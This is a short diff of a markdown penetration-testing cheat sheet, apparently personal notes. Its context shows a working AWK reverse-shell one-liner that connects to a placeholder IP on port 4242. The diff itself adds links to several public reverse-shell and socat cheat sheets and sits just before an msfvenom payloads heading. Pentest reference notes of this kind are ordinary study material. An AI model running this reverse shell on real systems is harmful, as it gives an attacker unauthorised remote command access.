@@ -74,10 +74,13 @@ AWK
 
     awk 'BEGIN {s = "/inet/tcp/0/IP ADDRESS/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
     
-Also Java: Reverse shells cheat sheet    
 [Tiberius Reverse Shells](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/reverse-shells.rst) 
+
 [Payload All the Things Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) 
 
+[Reverse Shell Cheatsheet](https://github.com/d4t4s3c/Reverse-Shell-Cheat-Sheet)  
+
+[Reverse and Bind Shells with Socat](https://erev0s.com/blog/encrypted-bind-and-reverse-shells-socat/)
 
 ## Msfvenom Payloads 
 
